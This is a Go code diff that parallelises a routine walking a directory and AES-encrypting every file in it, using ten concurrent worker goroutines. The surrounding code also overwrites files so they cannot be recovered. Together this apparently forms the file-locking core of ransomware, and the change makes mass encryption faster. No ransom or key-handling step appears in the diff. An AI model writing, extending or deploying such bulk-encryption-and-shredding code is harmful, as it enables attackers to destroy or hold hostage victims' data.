@@ -10,6 +10,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"sync"
 )
 
 // Delete and overwrite the contents of the file so that it cannot be recovered
@@ -91,24 +92,56 @@ func encryptFileAES(filepath string, key []byte) error {
 	return nil
 }
 
+// A worker reads the file (given by its filepath) from the channel, then conduct encryption
+// This will be executed concurrently by goroutines
+func encryptionWroker(workerNumber int, filepaths <-chan string, key []byte, wg *sync.WaitGroup) {
+	defer wg.Done()
+	for filepath := range filepaths {
+		err := encryptFileAES(filepath, key)
+		if err != nil {
+			fmt.Printf("[Worker #%02d]Encrypting file: %s => failed (reason: %v)\n", workerNumber, filepath, err)
+			continue
+		} else {
+			fmt.Printf("[Worker #%02d]Encrypting file: %s => success\n", workerNumber, filepath)
+		}
+	}
+}
+
 // EncryptDirectory walks through the directory and encrypts each file
 func EncryptDirectory(targetDirectory string, key []byte) error {
+	// Create a channel to share filepaths with the encryption worker goroutines
+	targetFiles := make(chan string, 1024)
+	var wg sync.WaitGroup
+
+	const numberOfEncryptionWorkers = 10
+	for i := 0; i < numberOfEncryptionWorkers; i++ {
+		wg.Add(1)
+		go encryptionWroker(i+1, targetFiles, key, &wg)
+	}
+
+	// Walk through the target directory and send the filepaths to the channel
 	err := filepath.Walk(targetDirectory, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
 
 		if !info.IsDir() {
-			fmt.Printf("Encrypting file: %s...", path)
-			err = encryptFileAES(path, key)
-			if err != nil {
-				log.Fatalf("Failed, error: %v", err)
-				return err
-			}
-			fmt.Printf("success\n")
+			targetFiles <- path
 		}
 		return nil
 	})
 
-	return err
+	if err != nil {
+		log.Fatalf("Error walking through directory: %v", err)
+		return err
+	}
+
+	// All target files have been sent to the channel
+	// Close the files channel and wait for all workers to finish
+	close(targetFiles)
+
+	// Wait for all workers to finish
+	wg.Wait()
+
+	return nil
 }
